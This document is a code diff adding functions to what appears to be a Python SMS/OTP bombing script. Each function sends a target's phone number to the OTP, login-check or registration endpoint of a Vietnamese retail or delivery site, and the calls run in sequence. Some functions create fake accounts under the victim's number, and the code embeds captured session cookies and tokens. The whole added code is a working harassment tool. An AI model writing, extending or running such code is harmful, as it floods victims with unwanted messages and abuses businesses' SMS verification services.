@@ -2307,7 +2307,304 @@ def hanoia():
     except requests.exceptions.RequestException:
         print("HANOIA | TRẠNG THÁI : THẤT BẠI")
 
+def ahamove():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json;charset=UTF-8',
+        'origin': 'https://app.ahamove.com',
+        'priority': 'u=1, i',
+        'referer': 'https://app.ahamove.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
 
+    json_data = {
+        'mobile': sdt,
+        'country_code': 'VN',
+        'firebase_sms_auth': True,
+    }
+
+    try:
+        response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("AHAMOVE | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("AHAMOVE | TRẠNG THÁI : THẤT BẠI")
+
+def fahasa():
+    cookies = {
+        'frontend': '2f118fe3b8c748c78199208b10b3f9cb',
+        'utm_source': 'chin',
+        'click_id': '8vTZ22kVeRZoISe',
+        'utm_medium': 'chin',
+        'utm_campaign': 'chin',
+        'utm_term': 'chin',
+        'utm_content': 'chin',
+        'frontend_cid': 'uqAGx0CC6GhLtoUa',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'frontend=2f118fe3b8c748c78199208b10b3f9cb; utm_source=chin; click_id=8vTZ22kVeRZoISe; utm_medium=chin; utm_campaign=chin; utm_term=chin; utm_content=chin; frontend_cid=uqAGx0CC6GhLtoUa',
+        'origin': 'https://www.fahasa.com',
+        'priority': 'u=1, i',
+        'referer': 'https://www.fahasa.com/?ref=chin&utm_source=chin&utm_medium=chin&utm_campaign=chin&utm_term=chin&utm_content=chin&click_id=8vTZ22kVeRZoISe',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("FAHASA | TRẠNG THÁI : THẤT BẠI") 
+
+def vascara():
+    cookies = {
+        'SHASH': 'ijiugnnbjqt1sravu0ag6dpvhn',
+        'ctk': 'a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c',
+        'fwlc': 'MQ%3D%3D',
+        '_t': 'ijiugnnbjqt1sravu0ag6dpvhn',
+        'ctiic': 'MA%3D%3D',
+        'cokilocationcode': 'dm4%3D',
+    }
+
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        # 'cookie': 'SHASH=ijiugnnbjqt1sravu0ag6dpvhn; ctk=a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c; fwlc=MQ%3D%3D; _t=ijiugnnbjqt1sravu0ag6dpvhn; ctiic=MA%3D%3D; cokilocationcode=dm4%3D',
+        'origin': 'https://www.vascara.com',
+        'priority': 'u=0, i',
+        'referer': 'https://www.vascara.com/register/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    data = {
+        'token': '6c6cf6eeb0482f868c3f921b12bf01ef4b1baef6',
+        'fphone': sdt,
+        'ffullname': 'nguyen thi huyen',
+        'fpassword': '123123aA@',
+        'fagree': '1',
+        'fsubmit': '1',
+    }
+
+    try:
+        response = requests.post('https://www.vascara.com/register/', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("VASCARA | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VASCARA | TRẠNG THÁI : THẤT BẠI")
+
+def sablanca():
+    cookies = {
+        'ASP.NET_SessionId': '1psn00n0dg1cj303ia2pi32e',
+    }
+
+    headers = {
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': 'ASP.NET_SessionId=1psn00n0dg1cj303ia2pi32e',
+        'Origin': 'https://sablanca.vn',
+        'Referer': 'https://sablanca.vn/dang-ky',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    data = {
+        'numberphone': sdt,
+        'utm_source': 'Register',
+    }
+
+    try:
+        response = requests.post('https://sablanca.vn/User/CheckCustomerPhoneIsCreateV21', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("SABLANCA | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("SABLANCA | TRẠNG THÁI : THẤT BẠI")
+
+def sandro():
+    cookies = {
+        'PHPSESSID': 'e4dm9dd73g7s1p5s8a0408osmu',
+        'form_key': 'MVfTxS24jyAJkIgf',
+        'form_key': 'MVfTxS24jyAJkIgf',
+        'category_first': '3',
+        'mage-cache-storage': '%7B%7D',
+        'mage-cache-storage-section-invalidation': '%7B%7D',
+        'mage-cache-sessid': 'true',
+        'recently_viewed_product': '%7B%7D',
+        'recently_viewed_product_previous': '%7B%7D',
+        'recently_compared_product': '%7B%7D',
+        'recently_compared_product_previous': '%7B%7D',
+        'product_data_storage': '%7B%7D',
+        'mage-messages': '',
+        'mgn_menu_category_1': '21',
+        'private_content_version': '4fa1b90d7f995085e3ce9442f6fa924a',
+        'section_data_ids': '%7B%7D',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'PHPSESSID=e4dm9dd73g7s1p5s8a0408osmu; form_key=MVfTxS24jyAJkIgf; form_key=MVfTxS24jyAJkIgf; category_first=3; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; mgn_menu_category_1=21; private_content_version=4fa1b90d7f995085e3ce9442f6fa924a; section_data_ids=%7B%7D',
+        'origin': 'https://sandro.com.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://sandro.com.vn/customer/account/create/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'number_phone': sdt,
+        'form_key': 'MVfTxS24jyAJkIgf',
+        'currentUrl': 'https://sandro.com.vn/customer/account/create/',
+    }
+
+    try:
+        response = requests.post('https://sandro.com.vn/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("SANDRO | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("SANDRO | TRẠNG THÁI : THẤT BẠI")
+
+def routine():
+    cookies = {
+        'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
+        'X-Magento-Vary': '7ad851671356eb8fbf873fbdb216dde0a2e0c003',
+        'PHPSESSID': 'j54mg8mlaj1fe1tpa8n7lig4g1',
+        'mage-cache-storage': '%7B%7D',
+        'mage-cache-storage-section-invalidation': '%7B%7D',
+        'mage-cache-sessid': 'true',
+        'recently_viewed_product': '%7B%7D',
+        'recently_viewed_product_previous': '%7B%7D',
+        'recently_compared_product': '%7B%7D',
+        'recently_compared_product_previous': '%7B%7D',
+        'product_data_storage': '%7B%7D',
+        'mage-messages': '',
+        'form_key': 'JUHbfiSaEBTLQRud',
+        'private_content_version': '7f7eeb6ab1ef8a3d8536cfcfa413ff07',
+        'section_data_ids': '%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; PHPSESSID=j54mg8mlaj1fe1tpa8n7lig4g1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=JUHbfiSaEBTLQRud; private_content_version=7f7eeb6ab1ef8a3d8536cfcfa413ff07; section_data_ids=%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
+        'origin': 'https://routine.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://routine.vn/phu-kien/giay-dep.html',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'telephone': sdt,
+        'isForgotPassword': '0',
+    }
+
+    try:
+        response = requests.post('https://routine.vn/customer/otp/send/', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("ROUTINE | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("ROUTINE | TRẠNG THÁI : THẤT BẠI")
+        
+def coolmate():
+    cookies = {
+        'device_token': '597f946e29e835d88f56392f40ea75c3',
+        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
+        'cart_quantity': '0',
+        'active-voucher1': 'true',
+        'affiliate_content': '%7B%22time_stamp%22%3A1721645343%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fao-thun-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.165%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjwhvi0BhA4EiwAX25ujy3lXW-SzLrWClAwv-fcDMt1jRqtd66LlrUfZ891qpNlFAjPd_jL2xoCrPEQAvD_BwE%22%7D',
+        'g_state': '{"i_p":1721731756061,"i_l":2}',
+        'redirect_url': 'eyJpdiI6IjVIRCtoazd6dWd4aXlGSk0rMzR1WlE9PSIsInZhbHVlIjoiYmNvdXZSWXZJV3NRUUs0Yml1Vk80MXR4b3Z0UndvZTd0WHpZM2MrQlNOY0plWDdaMjhmMFpZeUxRVlRlQ29DOSIsIm1hYyI6IjQxNTI2Yjg0NzZlOTQ0ZWQ0MTYwODMzYjU0NzhmODk2ODE5Y2YxZjAzNDg1MDI1ZjhjYTdjMmY5NWFkNjZjN2IifQ%3D%3D',
+        'XSRF-TOKEN': 'eyJpdiI6IldGZ293cmxOeDR3TGpnaGJvWFdGM2c9PSIsInZhbHVlIjoiOWZPT1d1bWNiWGtzbUh1WEd2K3RBRm5kUit3bFY2bnFNSWpTWHpyZGRQWmtnekJLY2pGQ3d6Nzh1Njd1TmRjNCIsIm1hYyI6IjhkYTIxYmIwOWRjY2ZiMDQwNzEwY2Q3MGYyNGFiNWM0NzY4MzRjMGE0MGVhZTY0MmU1NmQ5YjJkOGY5MDZkOGQifQ%3D%3D',
+        'laravel_session': 'eyJpdiI6ImlZazZDeUI3dldLS0krUWdXcnRhVmc9PSIsInZhbHVlIjoiVUhNWWZuRjgxNXFuY2ZYR0NTRG41RXZ4VEJ3YVk5ZkRMbmZmdkpyYlpFaHBGbndcL0lWcE5VNFVGZFFxellpenciLCJtYWMiOiJiYTE1YTIzMjhmMzVmYzc5MzMxYjQyYzM2MTZiYjc1Mjg4MTE1M2IzMjU2ZTI2NDNiNjhmNGNkY2ViNmU1YjMyIn0%3D',
+    }
+
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; affiliate_content=%7B%22time_stamp%22%3A1721645343%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fao-thun-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.165%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjwhvi0BhA4EiwAX25ujy3lXW-SzLrWClAwv-fcDMt1jRqtd66LlrUfZ891qpNlFAjPd_jL2xoCrPEQAvD_BwE%22%7D; g_state={"i_p":1721731756061,"i_l":2}; redirect_url=eyJpdiI6IjVIRCtoazd6dWd4aXlGSk0rMzR1WlE9PSIsInZhbHVlIjoiYmNvdXZSWXZJV3NRUUs0Yml1Vk80MXR4b3Z0UndvZTd0WHpZM2MrQlNOY0plWDdaMjhmMFpZeUxRVlRlQ29DOSIsIm1hYyI6IjQxNTI2Yjg0NzZlOTQ0ZWQ0MTYwODMzYjU0NzhmODk2ODE5Y2YxZjAzNDg1MDI1ZjhjYTdjMmY5NWFkNjZjN2IifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IldGZ293cmxOeDR3TGpnaGJvWFdGM2c9PSIsInZhbHVlIjoiOWZPT1d1bWNiWGtzbUh1WEd2K3RBRm5kUit3bFY2bnFNSWpTWHpyZGRQWmtnekJLY2pGQ3d6Nzh1Njd1TmRjNCIsIm1hYyI6IjhkYTIxYmIwOWRjY2ZiMDQwNzEwY2Q3MGYyNGFiNWM0NzY4MzRjMGE0MGVhZTY0MmU1NmQ5YjJkOGY5MDZkOGQifQ%3D%3D; laravel_session=eyJpdiI6ImlZazZDeUI3dldLS0krUWdXcnRhVmc9PSIsInZhbHVlIjoiVUhNWWZuRjgxNXFuY2ZYR0NTRG41RXZ4VEJ3YVk5ZkRMbmZmdkpyYlpFaHBGbndcL0lWcE5VNFVGZFFxellpenciLCJtYWMiOiJiYTE1YTIzMjhmMzVmYzc5MzMxYjQyYzM2MTZiYjc1Mjg4MTE1M2IzMjU2ZTI2NDNiNjhmNGNkY2ViNmU1YjMyIn0%3D',
+        'origin': 'https://www.coolmate.me',
+        'priority': 'u=1, i',
+        'referer': 'https://www.coolmate.me/account/register',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'GzCw2nVV8RIFiuB3x47ySHEel1qgAVQVytf79QrI',
+    }
+
+    json_data = {
+        'fullname': 'tran quoc huuh',
+        'email': 'quadeptrai@gmail.com',
+        'phone': sdt,
+        'password': '123123123',
+        'ajax': True,
+    }
+
+    try:
+        response = requests.post('https://www.coolmate.me/account/register', cookies=cookies, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("COOLMATE | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("COOLMATE | TRẠNG THÁI : THẤT BẠI")
+        
 
 tv360()
 time.sleep(1)
@@ -2422,4 +2719,18 @@ time.sleep(1)
 watsons()
 time.sleep(1)
 hanoia()
+time.sleep(1)
+ahamove()
+time.sleep(1)
+fahasa()
+time.sleep(1)
+vascara()
+time.sleep(1)
+sablanca()
+time.sleep(1)
+sandro()
+time.sleep(1)
+routine()
+time.sleep(1)
+coolmate()
 time.sleep(1)
